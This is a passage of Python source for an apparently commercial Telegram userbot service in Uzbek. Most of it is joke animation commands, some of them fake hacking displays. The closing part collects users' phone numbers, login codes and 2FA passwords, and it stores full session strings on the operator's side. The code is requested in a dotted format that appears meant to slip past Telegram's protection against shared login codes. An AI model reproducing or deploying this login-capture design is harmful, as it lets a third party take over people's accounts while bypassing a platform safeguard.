            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.engine'))
    async def engine_start(event):
        for frame in ["🔘 ENGINE: OFF","🟠 ENGINE: STARTING...","🟡 ENGINE: [▬▭▭▭▭]","🟡 ENGINE: [▬▬▬▭▭]","🟢 ENGINE: [▬▬▬▬▬▬]","🚀 **PARVOZGA TAYYOR!**"]:
            await event.edit(f"<b>{frame}</b>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.aim'))
    async def sniper_aim(event):
        for frame in ["🔍 [      +      ]","🔍 [    +        ]","🔍 [       +     ]","🎯 [      🟢      ]","🔥 [      💥      ]","💀 **Nishon yo'q qilindi.**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.shock'))
    async def shock_anim(event):
        frames = ["⚡️— — — —","— ⚡️— — —","— — ⚡️— —","— — — ⚡️—","— — — — ⚡️","💥 **BOOM! TIZIMDA QISQA TUTASHUV!**"]
        for _ in range(2):
            for frame in frames[:5]:
                await event.edit(f"<code>{frame}</code>", parse_mode='html')
                await asyncio.sleep(0.2)
        await event.edit(frames[5])

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.ice'))
    async def ice_anim(event):
        for frame in ["🔥 Issiq","⛅️ Iliq","☁️ Sovuq","❄️ Muzlamoqda...","🧊 **MUZLAB QOLDI!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.charge'))
    async def charge_anim(event):
        for frame in ["🔋 [          ] 0%","🔋 [▬▬        ] 20%","🔋 [▬▬▬      ] 40%","🔋 [▬▬▬▬▬    ] 60%","🔋 [▬▬▬▬▬▬▬  ] 80%","🔋 [▬▬▬▬▬▬▬▬▬▬] 100%","⚡️ **Professional Userbot to'liq quvvatda!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.lab'))
    async def lab_anim(event):
        for frame in ["🧪 ➕ 🧪","⚗️ 🔄 ⚗️","🧼 🧼 🧼","💨 💨 💨","💎 **Natija: Titan Elementi topildi!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.hole'))
    async def blackhole_anim(event):
        frames = ["   . . .   ","  . ● .  "," . ● ● . ","  . ● .  ","   . . .   ","🌀 **HAMMASI YUTIB YUBORILDI!**"]
        for _ in range(2):
            for frame in frames[:5]:
                await event.edit(f"<code>{frame}</code>", parse_mode='html')
                await asyncio.sleep(0.3)
        await event.edit(frames[5])

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.duel'))
    async def duel_anim(event):
        for frame in ["⚔️ ( •_•)        (•_• )","⚔️ ( •_•)>      (•_• )","⚔️      ⚔️(•_•) (•_• )","⚔️      ( •_•)⚔️(•_• )","⚔️      ( •_•)  (✖️_✖️)","🏆 **Professional Userbot g'alaba qozondi!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.brute'))
    async def brute_anim(event):
        await event.edit("🔑 **Parol tanlanmoqda...**")
        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        for _ in range(10):
            fake_pass = "".join(random.choice(chars) for _ in range(8))
            await event.edit(f"🔑 **Checking:** <code>{fake_pass}</code>", parse_mode='html')
            await asyncio.sleep(0.2)
        await event.edit("🔓 **Muvaffaqiyatli!**\n✅ **Parol:** `Titan_Pro_Uz_2026`")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.grafik'))
    async def graph_anim(event):
        for frame in ["📈 [ _ ] 0%","📈 [ _/ ] 20%","📈 [ _/— ] 50%","📈 [ _/—/ ] 80%","📈 [ _/—/↗️ ] 100%","🚀 **TITAN PRO natijasi: REKORD!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.spider'))
    async def spider_anim(event):
        for frame in ["🕸","🕸\n  ┃","🕸\n  ┃\n  🕷","🕸\n  ┃\n  🕸\n  ┃\n  🕷","🕷 **Titan Pro hamma joyda!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.radar'))
    async def radar_anim(event):
        frames = ["📡 RADAR: [ / ]","📡 RADAR: [ — ]","📡 RADAR: [ | ]","📡 RADAR: [ / ]",
                  "🎯 **Nishon topildi!**\n📍 **Joylashuv:** `Namangan, Uzbekistan`"]
        for _ in range(3):
            for frame in frames[:4]:
                await event.edit(f"<code>{frame}</code>", parse_mode='html')
                await asyncio.sleep(0.3)
        await event.edit(frames[4])

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.traktor'))
    async def tractor_anim(event):
        for frame in ["🚜                      ","  🚜                    ","    🚜                  ",
                      "      🚜                ","        🚜   🌾🌾🌾      ","          🚜 🌾🌾🌾      ",
                      "            🚜           ","✅ **Ish yakunlandi!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.think'))
    async def ai_thinking(event):
        frames = ["🤖 <b>AI:</b> <code>Tahlil qilinmoqda...</code>","🧠 <b>Neyronlar:</b> ⚡️⚡️⚡️","💎 <b>Xulosa:</b> 💎","🚀 **Hamma narsa tayyor! Buyruqni kutyapman.**"]
        current = ""
        for frame in frames:
            current += f"{frame}\n"
            await event.edit(current, parse_mode='html')
            await asyncio.sleep(0.7)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.backup'))
    async def backup_anim(event):
        for frame in ["☁️ <b>Bulutli xotira:</b> <code>Connecting...</code>",
                      "📤 <b>Uploading:</b> <code>[■□□□□] 20%</code>",
                      "📤 <b>Uploading:</b> <code>[■■□□□] 40%</code>",
                      "📤 <b>Uploading:</b> <code>[■■■□□] 60%</code>",
                      "📤 <b>Uploading:</b> <code>[■■■■■] 100%</code>",
                      "✅ <b>Zaxira nusxa yaratildi!</b>"]:
            await event.edit(frame, parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.flight'))
    async def flight_anim(event):
        for frame in ["🛫 ___________","🛫 ☁️ ________","☁️ 🛫 _______","☁️ ☁️ 🛫 ____","☁️ ☀️ ☁️ 🛫 __","☁️ ☁️ ☁️ ☁️ 🛬","🏢 **Manzilga yetib keldik!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.error'))
    async def fake_error(event):
        for frame in ["⚠️ <b>System Error!</b>","❌ <code>Critical: Memory Leak</code>",
                      "🛑 <code>Rebooting in 3...</code>","🛑 <code>Rebooting in 2...</code>",
                      "🛑 <code>Rebooting in 1...</code>","😎 **Hazillashdim! Professional Userbot doim onlayn!**"]:
            await event.edit(frame, parse_mode='html')
            await asyncio.sleep(0.7)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.calc_pro'))
    async def calc_animation(event):
        for formula in ["x² + y² = z²","E = mc²","∫(f(x)) dx","lim(x→∞)","✅ **Yechim: Professional Userbot V25**"]:
            await event.edit(f"🧬 **Matematik tahlil:**\n<code>{formula}</code>", parse_mode='html')
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.decrypt (.+)'))
    async def decrypt_text(event):
        text    = event.pattern_match.group(1)
        symbols = ["*","%","$","#","@","&","!","?"]
        temp_text = "".join(random.choice(symbols) for _ in text)
        await event.edit(f"🔐 <b>Shifrlangan:</b> <code>{temp_text}</code>", parse_mode='html')
        await asyncio.sleep(0.8)
        decrypted = ""
        for char in text:
            decrypted    += char
            current_view  = decrypted + "".join(random.choice(symbols) for _ in range(len(text)-len(decrypted)))
            await event.edit(f"🔓 <b>Ochildi:</b> <code>{current_view}</code>", parse_mode='html')
            await asyncio.sleep(0.1)
        await event.edit(f"✅ <b>Xabar:</b> <code>{text}</code>", parse_mode='html')

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.destruct'))
    async def self_destruct_anim(event):
        for i in range(5, 0, -1):
            await event.edit(f"⚠️ **DIQQAT!**\nUshbu xabar `{i}` soniyadan keyin o'z-o'zini yo'q qiladi!")
            await asyncio.sleep(1)
        for f in ["💥 PORTLADI!","💨"," "]:
            await event.edit(f)
            await asyncio.sleep(0.3)
        await event.delete()

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.connect'))
    async def server_connect(event):
        for frame in ["🌐 <code>ping 8.8.8.8 -t</code>","📡 <b>Signal:</b> 🟢 📶",
                      "🔑 <b>Handshake:</b> 🤝","🛠 <b>Encryption:</b> AES-256",
                      "🔓 <b>SSH Tunnel:</b> Ochiq","✅ <b>TIZIMGA ULANDI!</b>"]:
            await event.edit(frame, parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.search'))
    async def deep_search(event):
        for frame in ["🔍 🔎 🔍 🔎","📂 <b>Ma'lumotlar bazasi ochilmoqda...</b>",
                      "📑 <code>Checking: Users_list.db</code>",
                      "📑 <code>Checking: Secret_files.enc</code>",
                      "🧬 <b>DNK mos kelishi: 99.9%</b>","🎯 <b>Nishon aniqlandi!</b>"]:
            await event.edit(frame, parse_mode='html')
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.unzip'))
    async def unzip_anim(event):
        files = ["config.json","main.py","database.db","assets.zip"]
        await event.edit("📂 Arxiv ochilmoqda...")
        await asyncio.sleep(0.5)
        current = "📂 <b>Extracting:</b>"
        for f in files:
            current += f"\n └ 📄 <code>{f}</code>"
            await event.edit(current, parse_mode='html')
            await asyncio.sleep(0.5)
        await event.edit(current + "\n\n✅ <b>Barcha fayllar ochildi!</b>", parse_mode='html')

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.detect_os'))
    async def os_detector(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Buning uchun biror xabarga reply qiling!**")
        for frame in ["🌐 IP manzil aniqlanmoqda...","⚙️ Qurilma turi tahlil qilinmoqda...",
                      "🍎 OS: iOS qidirilmoqda...","🤖 OS: Android qidirilmoqda...","✅ Natija topildi!"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.6)
        res = random.choice(["Android User 📱","iPhone User 🍏","PC User 💻","Telegram Web 🌐"])
        await event.edit(f"🔍 **Natija:** <code>{res}</code>", parse_mode='html')

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.satellite'))
    async def satellite_anim(event):
        for frame in ["📡 Signal qidirilmoqda...","🛰 Sun'iy yo'ldoshga ulanmoqda...",
                      "🛰 [|         ]","🛰 [||||      ]","🛰 [||||||||  ]",
                      "🛰 [||||||||||]","📡 Signal qabul qilindi. ✅",
                      "🚀 **Xabar muvaffaqiyatli uzatildi!**"]:
            await event.edit(f"<b>{frame}</b>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.terminal'))
    async def terminal_anim(event):
        frames = ["user@titan:~$ sudo access","user@titan:~$ [********]","user@titan:~$ connecting...","user@titan:~$ connected to server.","user@titan:~$ root access: ✅"]
        current = ""
        for frame in frames:
            current += f"\n{frame}"
            await event.edit(f"<code>{current}</code>", parse_mode='html')
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.temp'))
    async def temperature_anim(event):
        for frame in ["🌡 10°C","🌡 30°C","🌡 60°C","🌡 90°C","🔥 100°C","💥 **BOOM!**"]:
            await event.edit(f"<b>{frame}</b>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.flash'))
    async def flash_anim(event):
        for frame in ["🌑","🌕","🌑","🌕","⚡️","✨","⚪️","💨"]:
            await event.edit(frame)
            await asyncio.sleep(0.2)
        await event.edit("🚀 **Tezlik: Maxima!**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.build'))
    async def building_anim(event):
        for frame in ["🏗","🏗\n🧱","🏗\n🧱🧱","🏗\n🧱🧱🧱","🏠","🏡 **Yangi bino qurildi!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.mushak'))
    async def firework_anim(event):
        for frame in ["🚀","🚀","💥","✨","🌟","🎈","🎊","🎉","🥳"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)
        await event.edit("🎊 **TABRIKLAYMIZ!** 🎊")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.galaxy'))
    async def galaxy_anim(event):
        frames = ["🌌","🪐","🌟","☄️","🚀","🛸","👨‍🚀","🛰"]
        for _ in range(2):
            for frame in frames:
                await event.edit(f"{frame} **Titan Pro galaktika bo'ylab...** {frame}")
                await asyncio.sleep(0.4)
        await event.edit("🌍 **Yer sayyorasiga qaytildi.**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.virus'))
    async def virus_anim(event):
        for frame in ["⚠️ **DIQQAT: Tizimda virus aniqlandi!**","🔴 **Xavf darajasi: Yuqori**",
                      "🔄 **Fayllar o'chirilmoqda...**","0%.. 25%.. 50%.. 85%.. 100%",
                      "💀 **Siz xakerlar hujumiga uchradingiz!**","😜 **Hazillashdim, bu shunchaki Professional Userbot!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.detect'))
    async def lie_detector(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Xabarga reply qiling!**")
        for frame in ["🧐 **Xabar tahlil qilinmoqda...**","⚖️ **Dalillar tekshirilmoqda...**","🧬 **Mantiqiy bog'liqlik ko'rilmoqda...**","🔎 **Natija:**"]:
            await event.edit(frame)
            await asyncio.sleep(0.6)
        result = random.choice(["✅ 100% HAQIQAT","❌ 100% YOLG'ON","🤔 SHUBHALI GAP"])
        await event.edit(f"🔎 **Natija:**\n\n`{result}`")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.tetris'))
    async def tetris_anim(event):
        for frame in ["🟦\n\n      ","🟦\n🟨\n      ","  🟦\n🟨\n🟥     ","🟪\n  🟦\n🟨\n🟥     ","✅ **TETRIS!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.fish'))
    async def fish_anim(event):
        for frame in ["🎣       🌊","🎣   ☁️  🌊","🎣      🐟","🎣    🐟","🎣  🐟","🍱 **Baliq tutildi va pishirildi!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.fight'))
    async def fight_anim(event):
        for frame in ["🤺      🤺","🤺    🤺","🤺  🤺","🤺🤺","🥊💥🤺","🥇 **Professional Userbot g'olib!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.magic'))
    async def magic_anim(event):
        for frame in ["🎩","✨🎩✨","✨🪄🎩","🎩🐇","🐇✨ **Tadaaam!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.break'))
    async def break_heart(event):
        for _ in range(3):
            for frame in ["❤️","💓"]:
                await event.edit(frame)
                await asyncio.sleep(0.4)
        await event.edit("💔")
        await asyncio.sleep(0.5)
        await event.edit("🥀 **Hammasi tugadi.**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.thunder'))
    async def thunder_anim(event):
        for frame in ["☁️","☁️☁️","☁️⚡️☁️","⚡️⚡️⚡️","💥","🔥","☁️","🌈"]:
            await event.edit(frame)
            await asyncio.sleep(0.3)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.taxi'))
    async def taxi_anim(event):
        for frame in ["🚕      🏠","  🚕    🏠","    🚕  🏠","      🚕🏠","      🚕💥","✅ **Manzilga yetib keldik!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.rain'))
    async def rain_anim(event):
        for frame in ["☁️","☁️\n 💧","☁️\n 💧 💧","⛈\n 💧 💧 💧","⛈\n ⚡️ 💧 💧","🌈 **Yomg'ir tugadi!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.ufo'))
    async def ufo_anim(event):
        for frame in ["🛸       ","🛸  👽   ","🛸  ✨   ","🛸  🧍   ","🛸✨🧍   ","🛸✨     ","🛸       ","🚀 **Olib ketildi!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.dragon'))
    async def dragon_anim(event):
        for frame in ["🐉","🐉☁️","🐉☁️🔥","🐉☁️🔥🔥","🐉🔥🔥🔥","🐲🔥🔥🔥🔥","🐲💥💥💥","💨💨💨","💀 **Titan Pro dushmanlarni kul qildi!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.dna'))
    async def dna_anim(event):
        for frame in ["🧬 🧬 🧬 🧬 🧬 🧬",
                      "🧬 🧬 🧬 🧬 🧬 🧬\n 🧬 🧬 🧬 🧬 🧬 🧬",
                      "🧬 🧬 🧬 🧬 🧬 🧬\n  🧬 🧬 🧬 🧬 🧬 🧬\n   🧬 🧬 🧬 🧬 🧬 🧬",
                      "🧬 **DNK tahlili boshlandi...**","🧬 **99% tayyor...**",
                      "🧬 **Natija:** Sizda haqiqiy Titan genlari topildi! 🚀"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.brain'))
    async def brain_anim(event):
        for frame in ["🧠 **Fikrlanmoqda...**","💡 **G'oya keldi!**","⚙️ **Tahlil ketmoqda...**","📚 **Bazadan qidirilmoqda...**","✅ **Yechim topildi!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.7)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.earth'))
    async def earth_anim(event):
        frames = ["🌍","🌎","🌏","🌑","🌒","🌓","🌔","🌕"]
        for _ in range(3):
            for frame in frames:
                await event.edit(f"{frame} **Titan Pro kosmosda...**")
                await asyncio.sleep(0.3)
        await event.edit("🚀 **Missiya muvaffaqiyatli yakunlandi!**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.casino'))
    async def casino_anim(event):
        emojis = ["🍎","🍋","🍒","💎","🔔","7️⃣"]
        for _ in range(15):
            a, b, c = random.sample(emojis, 3)
            await event.edit(f"🎰 **JACKPOT?**\n\n  ┃ {a} ┃ {b} ┃ {c} ┃")
            await asyncio.sleep(0.2)
        await event.edit("🎰 **NATIJA:**\n\n  ┃ 7️⃣ ┃ 7️⃣ ┃ 7️⃣ ┃\n\n🎉 **SIZ G'OLIBSIZ!**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.love'))
    async def love_anim(event):
        frames = ["❤️","🧡","💛","💚","💙","💜","🖤","🤍","💖","💝","❤️‍🔥"]
        for _ in range(2):
            for frame in frames:
                await event.edit(frame)
                await asyncio.sleep(0.3)
        await event.edit("✨ **Siz uchun maxsus!** ✨")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.lovestory'))
    async def love_animation(event):
        hearts = ["❤️","🧡","💛","💚","💙","💜","🖤","🤍","🤎","❤️"]
        for heart in hearts:
            try:
                await event.edit(f"✨ {heart} LOVE {heart} ✨")
                await asyncio.sleep(0.3)
            except Exception:
                continue

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.boom'))
    async def boom_animation(event):
        for frame in ["💣","💥","🔥","💨","✨","✅"]:
            try:
                await event.edit(frame)
                await asyncio.sleep(0.4)
            except Exception:
                continue

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.scan'))
    async def scan_anim(event):
        await event.edit("🔍 **Foydalanuvchi tahlil qilinmoqda...**")
        for frame in ["📡 10% [▬▭▭▭▭▭▭▭▭▭]","📡 30% [▬▬▬▭▭▭▭▭▭▭]",
                      "📡 55% [▬▬▬▬▬▭▭▭▭▭]","📡 85% [▬▬▬▬▬▬▬▬▭▭]",
                      "📡 100% [▬▬▬▬▬▬▬▬▬▬]",
                      "🚀 **Tahlil yakunlandi!**\n\n✅ **Natija:** Bu foydalanuvchi haqiqiy Professional do'sti! 😎"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.loading'))
    async def loading_anim(event):
        for frame in ["⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 0%","⬛️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 10%",
                      "⬛️⬛️⬜️⬜️⬜️⬜️⬜️⬜️ 30%","⬛️⬛️⬛️⬜️⬜️⬜️⬜️⬜️ 50%",
                      "⬛️⬛️⬛️⬛️⬛️⬜️⬜️⬜️ 70%","⬛️⬛️⬛️⬛️⬛️⬛️⬜️⬜️ 90%",
                      "⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️ 100%","✅ **Yuklanish yakunlandi!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.load'))
    async def load_anim(event):
        await event.edit("📥 **Ma'lumot tayyorlanmoqda...**")
        await asyncio.sleep(0.5)
        frames = [
            ("🟥⬜⬜⬜⬜⬜⬜⬜⬜⬜","10%"),("🟥🟧⬜⬜⬜⬜⬜⬜⬜⬜","20%"),
            ("🟥🟧🟨⬜⬜⬜⬜⬜⬜⬜","30%"),("🟥🟧🟨🟩⬜⬜⬜⬜⬜⬜","40%"),
            ("🟥🟧🟨🟩🟦⬜⬜⬜⬜⬜","50%"),("🟥🟧🟨🟩🟦🟪⬜⬜⬜⬜","60%"),
            ("🟥🟧🟨🟩🟦🟪⬛⬜⬜⬜","70%"),("🟥🟧🟨🟩🟦🟪⬛⬜⬜⬜","80%"),
            ("🟥🟧🟨🟩🟦🟪⬛⬜⬜⬜","90%"),("✅✅✅✅✅✅✅✅✅✅","100%")
        ]
        for bar, percent in frames:
            try:
                await event.edit(f"📥 **Titan Pro: Yuklash jarayoni**\n\n`[{bar}]` **{percent}**")
                await asyncio.sleep(0.4)
            except Exception:
                break
        await asyncio.sleep(0.5)
        await event.edit("✅ **Muvaffaqiyatli yuklandi!**")
        await asyncio.sleep(2)
        await event.delete()

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.type (.+)'))
    async def type_effect(event):
        text        = event.pattern_match.group(1)
        typing_text = ""
        for char in text:
            typing_text += char
            try:
                await event.edit(typing_text + " ⌨️")
                await asyncio.sleep(0.1)
            except Exception:
                continue
        await event.edit(typing_text)


# ═══════════════════════════════════════════════════════════════
#  ⑧ BOT /start
# ═══════════════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = update.effective_user
    if str(uid) not in users():
        DB["users"][str(uid)] = {
            "name": u.full_name, "username": u.username or "",
            "phone": "", "bought": False
        }
        db_save()
    await _show_user_main(update, uid)

async def _show_user_main(update: Update, uid: int):
    ub_active   = uid in UB
    has_session = bool(sessions().get(str(uid), {}).get("session"))
    rows = [[KeyboardButton("🛒 Kod sotib olish"), KeyboardButton("📞 Murojat qilish")]]
    if ub_active:
        rows.append([KeyboardButton("⏸ Userbotni to'xtatish")])
    elif has_session:
        rows.append([KeyboardButton("▶️ Userbotni yoqish")])
    else:
        rows.append([KeyboardButton("📱 Telefon raqamni ulash")])
    if is_admin(uid):
        rows.append([KeyboardButton("👑 Boshqaruv bo'limi")])
    kb     = ReplyKeyboardMarkup(rows, resize_keyboard=True)
    status = "🟢 Faol" if ub_active else "🔴 Faol emas"
    msg    = update.message or (update.callback_query.message if update.callback_query else None)
    if msg:
        await msg.reply_text(
            f"👋 <b>Assalomu alaykum, {update.effective_user.first_name}!</b>\n\n"
            f"🤖 <b>NICO Userbot holati:</b> {status}",
            parse_mode=ParseMode.HTML, reply_markup=kb
        )

# ═══════════════════════════════════════════════════════════════
#  ⑨ TELEFON / LOGIN
# ═══════════════════════════════════════════════════════════════
async def handle_phone_btn(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Raqamni yuborish", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )
    await update.message.reply_text("📱 Telegram raqamingizni yuboring:", reply_markup=kb)

async def handle_contact(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    phone = update.message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone
    DB["users"].setdefault(str(uid), {})["phone"] = phone
    db_save()
    STATES[uid] = {"step": "wait_code", "phone": phone}
    try:
        cl     = TelegramClient(StringSession(), API_ID, API_HASH)
        await cl.connect()
        result = await cl.send_code_request(phone)
        STATES[uid]["client"]    = cl
        STATES[uid]["code_hash"] = result.phone_code_hash
        await update.message.reply_text(
            f"📨 <b>Tasdiqlash kodi yuborildi!</b>\n\n"
            f"📱 Raqam: <code>{phone}</code>\n\n"
            f"Telegramdan kelgan <b>5 xonali kodni</b> quyidagi formatda yuboring:\n\n"
            f"✅ To'g'ri format: <code>1.2.3.4.5</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=ReplyKeyboardRemove()
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Xato: <code>{e}</code>", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#  ⑩ MATN HANDLERI
# ═══════════════════════════════════════════════════════════════
async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    text = (update.message.text or "").strip()

    step = STATES.get(uid, {}).get("step", "")

    # Admin "Boshqaruv bo'limi" tugmasi
    if is_admin(uid) and "Boshqaruv" in text:
        await _show_admin_menu(update)
        return

    # Admin step holatlari (kod yuklash, broadcast, javob va h.k.)
    if is_admin(uid) and step in (
        "up_name","up_pay","up_stars_price","up_card_name","up_card_number",
        "up_card_holder","up_card_price","up_card_confirm","wait_py_file","up_code",
        "edit_stars_price","edit_card_price","toggle_stars_price",
        "toggle_card_name","toggle_card_number","toggle_card_holder","toggle_card_price",
        "broadcast","admin_reply_to"
    ):
        await _admin_text(update, ctx, text)
        return

    # Admin pastki menyu tugmalari (admin paneli tugmalari)
    if is_admin(uid) and any(k in text for k in [
        "Kod yuklash","To'lov tizimlari","Xabar yuborish",
        "Narxni tahrirlash","Foydalanuvchilar","Restart"
    ]):
        await _admin_text(update, ctx, text)
        return

    if step == "wait_code":
        code = parse_tg_code(text)
        if code is None:
            await update.message.reply_text(
                "❌ <b>Noto'g'ri format!</b>\n\n"
                "Kodni faqat <b>nuqta bilan ajratib</b> yuboring:\n\n"
                "✅ To'g'ri: <code>1.2.3.4.5</code>",
                parse_mode=ParseMode.HTML)
            return
        await _do_sign_in(update, ctx, uid, code)
        return

    if step == "wait_2fa":
        await _do_2fa(update, ctx, uid, text)
        return

    if step == "wait_support":
        await _send_support_msg(update, ctx, uid, text)
        return

    if step == "wait_receipt":
        await _receipt_text_to_admin(update, ctx, uid, text)
        return

    if step == "user_reply_admin":
        await _send_user_reply_to_admin(update, ctx, uid, text)
        return

    if "Kod sotib olish" in text:
        await _show_buy(update.message, uid)
    elif "Murojat" in text:
        await _ask_support(update)
    elif "to'xtatish" in text:
        await _ub_stop_user(update, uid)
    elif "yoqish" in text:
        await _ub_start_user(update, uid)
    elif "Telefon" in text or "ulash" in text:
        await handle_phone_btn(update, ctx)
    else:
        await _show_user_main(update, uid)

async def _do_sign_in(update, ctx, uid, code):
    st = STATES.get(uid, {})
    cl = st.get("client")
    if not cl:
        return await update.message.reply_text("❌ /start bosing.")
    try:
        await cl.sign_in(st["phone"], code, phone_code_hash=st["code_hash"])
        await _finish_login(update, ctx, uid, cl)
    except SessionPasswordNeededError:
        STATES[uid]["step"] = "wait_2fa"
        await update.message.reply_text(
            "🔐 <b>2FA parol yoqilgan.</b>\n\nCloud parolingizni kiriting:",
            parse_mode=ParseMode.HTML)
    except Exception as e:
        await update.message.reply_text(f"❌ Kod xato: <code>{e}</code>", parse_mode=ParseMode.HTML)

async def _do_2fa(update, ctx, uid, password):
    cl = STATES.get(uid, {}).get("client")
    if not cl:
        return await update.message.reply_text("❌ /start bosing.")
    try:
        await cl.sign_in(password=password)
        await _finish_login(update, ctx, uid, cl)
    except Exception as e:
        await update.message.reply_text(f"❌ Parol xato: <code>{e}</code>", parse_mode=ParseMode.HTML)

async def _finish_login(update, ctx, uid, cl):
    session_str = cl.session.save()
    me = await cl.get_me()
    DB["users"][str(uid)]["name"]     = f"{me.first_name or ''} {me.last_name or ''}".strip()
    DB["users"][str(uid)]["username"] = me.username or ""
    DB["sessions"][str(uid)]          = {"session": session_str, "active": True, "phone": str(me.phone or "")}
    db_save()
    UB[uid] = cl
    _register_ub_handlers(cl)
    STATES.pop(uid, None)
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛒 Userbot kodini sotib olish", callback_data="buy_code")],
        [InlineKeyboardButton("📞 Murojat qilish", callback_data="support")]
    ])
    await update.message.reply_text(
        f"✅ <b>NICO Userbot muvaffaqiyatli ulandi!</b>\n\n"
        f"👤 Hisob: <b>{DB['users'][str(uid)]['name']}</b>\n"
